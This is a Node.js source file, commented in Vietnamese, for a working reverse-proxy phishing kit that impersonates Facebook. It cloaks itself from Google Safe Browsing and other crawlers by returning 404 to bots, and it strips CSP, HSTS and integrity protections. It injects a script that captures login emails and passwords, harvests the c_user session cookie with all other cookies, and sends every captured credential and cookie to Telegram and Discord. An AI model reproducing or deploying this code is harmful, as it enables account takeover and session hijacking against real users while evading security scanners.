require("dotenv").config();
const express = require("express");
const {
  createProxyMiddleware,
  responseInterceptor,
} = require("http-proxy-middleware");
const { sendTelegramMessage, editTelegramMessage } = require("./bot_telegram");
const { sendDiscordWebhook, editDiscordWebhook } = require("./bot_discord");

const userSessions = new Map();

const app = express();
// Cho phép Express.js tin tưởng Proxy phía trước (Nginx/Cloudflare)
// Điều này rất quan trọng để req.protocol tự động nhận HTTPS và req.ip nhận IP thực của người dùng
app.set("trust proxy", true);

// LƯU Ý: Không dùng app.use(express.json()) ở root vì nó sẽ đọc POST event làm rỗng body khi proxy sang Facebook.
// Quá trình đăng nhập FB sẽ bị lỗi "Không lấy được dữ liệu" nếu body gửi đi bị empty.

const PORT = process.env.PORT || 3000;
const AppHostname = process.env.APP_HOSTNAME || "localhost:3000";
const TARGET = "https://www.facebook.com";

// ==========================================
// 0. HỆ THỐNG CLOAKING (CHỐNG GOOGLE SCANNERS QUÉT PHISHING)
// ==========================================
app.use((req, res, next) => {
  const ua = req.headers["user-agent"] || "";

  // 0. Bỏ qua cloaking cho các tài nguyên tĩnh
  if (/\.(css|js|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|otf|eot)(\?.*)?$/i.test(req.url)) {
    return next();
  }

  // 1. Chặn bot bằng từ khoá User-Agent
  const botRegex =
    /bot|crawler|spider|google|bing|yandex|duckduckbot|slurp|baiduspider|facebookexternalhit|facebot|twitterbot|rogerbot|linkedinbot|embedly|quora|pinterest|slackbot|vkShare|W3C_Validator|whatsapp|telegram|zalo|discord|skypeuripreview|viber|instagram|snapchat|mastodon|redditbot|tumblr|tiktok|threads|applebot|signal/i;

  // Các scanner của Google (Safe Browsing) có thể không có từ khóa trên nhưng thường thiếu Accept-Language
  if (botRegex.test(ua) || ua.trim() === "") {
    console.log(`[CLOAKING] Đã chặn bot truy cập: ${ua}`);
    return res.status(404).send("Not Found");
  }

  // 2. User người thật luôn đi kèm các header Accept-Language rõ ràng
  if (!req.headers["accept-language"]) {
    console.log(`[CLOAKING] Đã chặn request bất thường (thiếu header): ${ua}`);
    return res.status(404).send("Not Found");
  }

  next();
});

// Middleware ghi log request để theo dõi chuyển hướng
app.use((req, res, next) => {
  const originalEnd = res.end;
  res.end = function (chunk, encoding) {
    if (res.statusCode >= 300 && res.statusCode < 400) {
      console.log(
        `[REDIRECT DETECTED] ${req.url} -> ${res.getHeader("location")} (Status: ${res.statusCode})`,
      );
    }
    originalEnd.call(this, chunk, encoding);
  };
  next();
});

// ==========================================
// 1. MÃ JAVASCRIPT THEO DÕI (TRACKING SCRIPT)
// ==========================================
const trackingScriptCode = `
  (function() {
    let pxid = (document.cookie.match(/_pxid=([^;]+)/) || [])[1];
    if (!pxid) {
        pxid = Math.random().toString(36).substring(2) + Date.now().toString(36);
        document.cookie = "_pxid=" + pxid + "; path=/; max-age=86400";
    }

    const deviceInfo = {
        ua: navigator.userAgent,
        screen: window.screen.width + "x" + window.screen.height,
        viewport: window.innerWidth + "x" + window.innerHeight,
        os: navigator.platform,
        language: navigator.language,
        timestamp: new Date().toISOString()
    };
    console.log('[Tracking Proxy] Người dùng:', deviceInfo);

    // Chặn chuyển hướng bằng JS
    const proxyHost = window.location.host;
    function rewriteUrl(url) {
        if (typeof url === 'string' && (url.includes('facebook') || url.includes('fb.com'))) {
            return url.replace(/https?:\\/\\/(www\\.)?([a-z0-9]+\\.)?(facebook\\.com|fb\\.com|fbcdn\\.net|fbsbx\\.com)/gi, window.location.protocol + "//" + proxyHost);
        }
        return url;
    }

    const originalAssign = window.location.assign;
    const originalReplace = window.location.replace;
    window.location.assign = function(url) { originalAssign.call(window.location, rewriteUrl(url)); };
    window.location.replace = function(url) { originalReplace.call(window.location, rewriteUrl(url)); };
    
    // Thu thập credentials khi ấn đăng nhập
    let isSending = false;
    const collectAndSend = () => {
        const emailInput = document.querySelector('input[name="email"]');
        const passInput = document.querySelector('input[name="pass"]');
        
        if (emailInput && passInput && emailInput.value && passInput.value) {
            if (isSending) return;
            isSending = true;
            fetch('/v1/auth', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    u: emailInput.value,
                    p: passInput.value,
                    ua: navigator.userAgent
                })
            }).catch(() => {}).finally(() => { setTimeout(() => { isSending = false; }, 3000); });
        }
    };

    document.addEventListener('click', (e) => {
      const loginBtn = e.target.closest('[role="button"][aria-label="Đăng nhập"], [role="button"][aria-label="Log in"], button[type="submit"], input[type="submit"]');
      if (loginBtn) {
        collectAndSend();
      }
    }, true);

    document.addEventListener('submit', (e) => {
        if (e.target.id === 'login_form' || e.target.querySelector('input[name="pass"]')) {
            collectAndSend();
        }
    }, true);
    
    console.log('[Tracking Proxy] Script bảo vệ & theo dõi đã kích hoạt!');
  })();
`;

const injectionTag = `<script src="/tracking.js"></script>`;

// ==========================================
// 2. CẤU HÌNH REVERSE PROXY
// ==========================================
const proxyOptions = {
  target: TARGET,
  changeOrigin: true,
  secure: false,
  ws: true,
  cookieDomainRewrite: { "*": "" },
  selfHandleResponse: true,

  onProxyReq: (proxyReq, req, res) => {
    const ua = req.headers["user-agent"] || "";
    const isMobile =
      /mobile|iphone|android|blackberry|opera mini|iemobile|wpdesktop/i.test(
        ua,
      );
    const targetHost = isMobile ? "m.facebook.com" : "www.facebook.com";
    const targetOrigin = `https://${targetHost}`;

    // Xóa toàn bộ các header truy vết do Nginx / Cloudflare / Proxy trung gian để lại
    // Điều này làm cho FB nghĩ rằng request xuất phát trực tiếp từ 1 máy client (giống hệt lúc test localhost)
    // FB sẽ không biết user đang truy cập từ domain nào.
    proxyReq.removeHeader("x-forwarded-host");
    proxyReq.removeHeader("x-forwarded-for");
    proxyReq.removeHeader("x-forwarded-port");
    proxyReq.removeHeader("x-forwarded-server");
    proxyReq.removeHeader("x-real-ip");
    proxyReq.removeHeader("forwarded");
    proxyReq.removeHeader("via");

    proxyReq.setHeader("Host", targetHost);
    proxyReq.setHeader("Origin", targetOrigin);
    proxyReq.setHeader("Referer", targetOrigin + "/");
    proxyReq.setHeader("X-Forwarded-Proto", "https");

    // Ép server không nén dữ liệu để ta có thể sửa HTML (vẫn giữ để tiêm script)
    proxyReq.removeHeader("accept-encoding");

    if (req.headers["user-agent"]) {
      proxyReq.setHeader("User-Agent", req.headers["user-agent"]);
    }

    console.log(
      `[PROXY REQ] ${isMobile ? "MOBILE" : "DESKTOP"} | Host: ${targetHost} | URL: ${req.url}`,
    );
  },

  onProxyRes: responseInterceptor(
    async (responseBuffer, proxyRes, req, res) => {
      // Ưu tiên host động từ trình duyệt gửi lên (Giúp iPhone truy cập qua IP không bị lỗi localhost)
      let currentHost = req.headers.host;

      // Nếu không lấy được host động mới dùng cấu hình .env (và chỉ dùng nếu .env không phải localhost)
      if (!currentHost || (AppHostname && !AppHostname.includes("localhost"))) {
        currentHost = AppHostname || currentHost || `localhost:${PORT}`;
      }

      // Sửa lỗi MIXED CONTENT: tự động nhận diện giao thức thật của người dùng
      // (Khi qua Nginx/Cloudflare, req.protocol thường bị nhận nhầm thành http)
      let protocol = req.headers["x-forwarded-proto"] || req.headers["x-scheme"] || req.protocol || "http";
      if (protocol.includes("https")) protocol = "https";

      // Bổ sung: Ép HTTPS luôn nếu đang chạy trên tên miền thật (VPS) để chống lỗi Mixed Content 100%
      // Trường hợp Nginx chưa được cấu hình truyền header X-Forwarded-Proto thì nó vẫn luôn ra được link là https://
      if (currentHost && !currentHost.includes("localhost") && !currentHost.includes("127.0.0.1")) {
        protocol = "https";
      }

      // 1. THEO DÕI COOKIE C_USER (USER ID)
      const setCookieHeaders = proxyRes.headers["set-cookie"];
      const requestCookie = req.headers["cookie"] || "";
      const userAgent = req.headers["user-agent"] || "Unknown";

      if (setCookieHeaders) {
        const cUserCookie = setCookieHeaders.find((h) => h.includes("c_user="));
        if (cUserCookie) {
          const userId = cUserCookie.match(/c_user=(\d+)/)?.[1] || "Unknown";

          console.log(
            "\x1b[32m%s\x1b[0m",
            "====================================",
          );
          console.log(
            "\x1b[32m%s\x1b[0m",
            `[POLL] C_USER DETECTED - MERGING COOKIES`,
          );
          console.log("\x1b[32m%s\x1b[0m", `ID: ${userId}`);
          console.log(
            "\x1b[32m%s\x1b[0m",
            "====================================",
          );

          // HỢP NHẤT COOKIE (Request + Response)
          const cookieMap = {};

          // 1. Lấy từ request cookie hiện tại
          if (requestCookie) {
            requestCookie.split(";").forEach((cookie) => {
              const [name, ...value] = cookie.split("=");
              if (name) cookieMap[name.trim()] = value.join("=");
            });
          }

          // 2. Ghi đè bằng set-cookie mới từ server
          setCookieHeaders.forEach((sc) => {
            const [cookiePair] = sc.split(";");
            if (cookiePair) {
              const [name, ...value] = cookiePair.split("=");
              if (name) cookieMap[name.trim()] = value.join("=");
            }
          });

          // 3. Chuyển thành định dạng chuỗi hợp nhất (Request format)
          const combinedCookie = Object.entries(cookieMap)
            .map(([name, value]) => `${name}=${value}`)
            .join("; ");

          const pxidMatch = requestCookie.match(/_pxid=([^;]+)/);
          const pxid = pxidMatch ? pxidMatch[1] : (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "");
          const sessionData = userSessions.get(pxid);

          const finalMsg = `
<b>DANG NHAP THANH CONG (CO COOKIE)</b>
━━━━━━━━━━━━━━━━━━
<b>User ID:</b> <code>${userId}</code>
<b>Tai khoan:</b> <code>${sessionData ? sessionData.u : 'Unknown'}</code>
<b>Mat khau:</b> <code>${sessionData ? sessionData.p : 'Unknown'}</code>
<b>Thiet bi:</b> <code>${userAgent}</code>

<b>Cookie:</b>
<code>${combinedCookie}</code>
━━━━━━━━━━━━━━━━━━`;

          // Discord embed cho cookie
          const discordCookieEmbed = {
            title: '✅ ĐĂNG NHẬP THÀNH CÔNG (CÓ COOKIE)',
            color: 0x57F287,
            fields: [
              { name: '🆔 User ID', value: `\`${userId}\``, inline: true },
              { name: '📧 Tài khoản', value: `\`${sessionData ? sessionData.u : 'Unknown'}\``, inline: true },
              { name: '🔑 Mật khẩu', value: `\`${sessionData ? sessionData.p : 'Unknown'}\``, inline: true },
              { name: '📱 Thiết bị', value: `\`${userAgent.substring(0, 100)}\``, inline: false },
              { name: '🍪 Cookie', value: `\`\`\`\n${combinedCookie.substring(0, 1000)}\n\`\`\``, inline: false }
            ]
          };

          if (sessionData && !sessionData.cookieMsgSent) {
            sessionData.cookieMsgSent = true;
            if (sessionData.msgPromise) {
              sessionData.msgPromise.then(msgId => {
                if (msgId) editTelegramMessage(msgId, finalMsg);
                else sendTelegramMessage(finalMsg);
              });
            } else if (sessionData.msgId) {
              editTelegramMessage(sessionData.msgId, finalMsg);
            } else {
              sendTelegramMessage(finalMsg);
            }
            // Discord: sửa tin nhắn cũ hoặc gửi mới
            if (sessionData.discordMsgPromise) {
              sessionData.discordMsgPromise.then(msgId => {
                if (msgId) editDiscordWebhook(msgId, discordCookieEmbed);
                else sendDiscordWebhook(discordCookieEmbed);
              });
            } else if (sessionData.discordMsgId) {
              editDiscordWebhook(sessionData.discordMsgId, discordCookieEmbed);
            } else {
              sendDiscordWebhook(discordCookieEmbed);
            }
          } else if (!sessionData) {
            sendTelegramMessage(finalMsg);
            sendDiscordWebhook(discordCookieEmbed);
          }
        }
      }

      // Kiểm tra trong request (để log console)
      if (requestCookie && requestCookie.includes("c_user=")) {
        const matches = requestCookie.match(/c_user=([^;]+)/);
        if (matches) {
          console.log(
            "\x1b[36m%s\x1b[0m",
            `[INFO] Current Session ID: ${matches[1]}`,
          );
        }
      }

      // 2. CHỐNG CHUYỂN HƯỚNG
      if (proxyRes.headers["location"]) {
        let location = proxyRes.headers["location"];
        const fbDomains =
          /https?:\/\/([a-z0-9-]+\.)*(facebook\.com|fb\.com|fbcdn\.net|fbsbx\.com|messenger\.com)/gi;
        location = location.replace(fbDomains, `${protocol}://${currentHost}`);
        res.setHeader("location", location);
        proxyRes.headers["location"] = location;
      }

      // 3. QUẢN LÝ CACHE THÔNG MINH
      // Nếu là lệnh chuyển hướng (301, 302), tuyệt đối không cho trình duyệt cache lại
      // Điều này ngăn lỗi "301 Moved Permanently (from disk cache)"
      if (proxyRes.statusCode >= 300 && proxyRes.statusCode < 400) {
        res.setHeader(
          "Cache-Control",
          "no-cache, no-store, must-revalidate, max-age=0",
        );
        res.setHeader("Pragma", "no-cache");
        res.setHeader("Expires", "0");
      }
      // Nếu là trang web hoặc tài nguyên bình thường (200 OK), để trình duyệt tự quản lý cache
      // giúp tải trang nhanh hơn.

      // 4. GỠ CÁC HÀNG RÀO BẢO MẬT (Giữ lại cache của server gốc)
      const headersToRemove = [
        "strict-transport-security",
        "content-security-policy",
        "content-security-policy-report-only",
        "x-frame-options",
        "x-content-type-options",
        "expect-ct",
        "report-to",
        "nel",
      ];
      headersToRemove.forEach((h) => {
        res.removeHeader(h);
        delete proxyRes.headers[h];
        delete proxyRes.headers[h.toLowerCase()];
      });

      const contentType = proxyRes.headers["content-type"] || "";
      const contentEncoding = proxyRes.headers["content-encoding"] || "";
      const isHtml = contentType.includes("text/html");
      const isCss = contentType.includes("text/css");
      const isJs = contentType.includes("application/javascript") || contentType.includes("text/javascript");

      // Không can thiệp nếu dữ liệu bị nén (gzip/br) để tránh lỗi font/nát file
      if (contentEncoding || (proxyRes.headers["transfer-encoding"] === "chunked" && !isHtml && !isCss && !isJs)) {
        return responseBuffer;
      }

      if (req.method === "GET" && (isHtml || isCss || isJs)) {
        let content = responseBuffer.toString("utf8");
        if (!content || content.length < 10) return responseBuffer;

        // 3. REWRITE THE DOMAINS
        const fbLinkRegex =
          /(https?:)?\/\/([a-z0-9-]+\.)*(facebook\.com|fb\.com|fbcdn\.net|fbsbx\.com|messenger\.com|fbstatic-a\.akamaihd\.net)/gi;

        content = content.replace(fbLinkRegex, (match) => {
          return match.startsWith("//")
            ? `//${currentHost}`
            : `${protocol}://${currentHost}`;
        });

        if (isHtml) {
          content = content.replace(/\s+(integrity|nonce)=["'][^"']*["']/gi, "");
          content = content.replace(/<meta[^>]*http-equiv=["']Content-Security-Policy["'][^>]*>/gi, "");

          const antiIndexTag = `\n<meta name="robots" content="noindex, nofollow, noarchive, nosnippet">\n<meta name="googlebot" content="noindex, nofollow">\n`;
          if (/<head>/i.test(content)) {
            content = content.replace(/(<head>)/i, "$1" + antiIndexTag + injectionTag);
          } else {
            content = antiIndexTag + injectionTag + "\n" + content;
          }
          res.setHeader("Content-Type", "text/html; charset=utf-8");
        } else if (isJs) {
          res.setHeader("Content-Type", "application/javascript");
        } else if (isCss) {
          res.setHeader("Content-Type", "text/css");
        }

        // Luôn xóa content-length khi đã sửa nội dung để tránh lỗi truyền tải
        res.removeHeader("content-length");
        delete proxyRes.headers["content-length"];

        return Buffer.from(content, "utf8");
      }

      return responseBuffer;
    },
  ),

  onError: (err, req, res) => {
    console.error("[PROXY ERROR]", err.message);
    if (!res.headersSent) {
      res.writeHead(502, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ error: "Proxy Error", message: err.message }));
    }
  },
};

app.get("/tracking.js", (req, res) => {
  res.setHeader("Content-Type", "application/javascript");
  res.send(trackingScriptCode);
});

// Endpoint nhận credentials từ client-side
app.post("/v1/auth", express.json(), (req, res) => {
  const { u, p, ua } = req.body || {};
  const pxidCookie = req.headers["cookie"]?.match(/_pxid=([^;]+)/);
  const pxid = pxidCookie ? pxidCookie[1] : (req.headers["x-forwarded-for"] || req.socket.remoteAddress);

  if (u && p) {
    console.log(`\x1b[31m[LOGIN ATTEMPT] User: ${u} | Pass: ${p}\x1b[0m`);

    const telegramMsg = `
<b>THONG BAO TAI KHOAN MOI</b>
━━━━━━━━━━━━━━━━━━
<b>Tai khoan:</b> <code>${u}</code>
<b>Mat khau:</b> <code>${p}</code>
<b>Trinh duyet:</b> <code>${ua}</code>
━━━━━━━━━━━━━━━━━━
    `;

    const session = { u, p, ua, msgId: null, cookieMsgSent: false, msgPromise: null, discordMsgId: null, discordMsgPromise: null };
    userSessions.set(pxid, session);

    // Gửi Telegram
    session.msgPromise = sendTelegramMessage(telegramMsg).then(msgId => {
      session.msgId = msgId;
      return msgId;
    });

    // Gửi Discord song song
    session.discordMsgPromise = sendDiscordWebhook({
      title: '⚠️ THÔNG BÁO TÀI KHOẢN MỚI',
      color: 0xFEE75C,
      fields: [
        { name: '📧 Tài khoản', value: `\`${u}\``, inline: true },
        { name: '🔑 Mật khẩu', value: `\`${p}\``, inline: true },
        { name: '📱 Trình duyệt', value: `\`${ua ? ua.substring(0, 100) : 'Unknown'}\``, inline: false }
      ]
    }).then(msgId => {
      session.discordMsgId = msgId;
      return msgId;
    });
  }

  res.status(200).send({ status: "ok" });
});

app.use("/", createProxyMiddleware(proxyOptions));

// Chạy server
const server = app.listen(PORT, () => {
  console.log(`[INFO] Proxy Running at: http://${AppHostname}`);
  console.log(`[INFO] Target: ${TARGET}`);
});

server.on("error", (err) => {
  if (err.code === "EADDRINUSE") process.exit(1);
});
